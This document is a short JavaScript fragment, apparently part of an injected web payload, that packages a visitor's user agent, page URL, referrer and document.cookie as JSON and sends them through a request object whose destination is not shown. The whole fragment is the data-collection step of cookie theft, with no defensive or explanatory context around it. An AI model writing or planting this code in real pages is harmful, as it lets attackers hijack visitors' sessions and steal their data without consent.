this.send(JSON.stringify({
	ua: navigator.userAgent, 
	pageUrl: String(document.location), 
	referrer: document.referrer,
	cookies: document.cookie
}));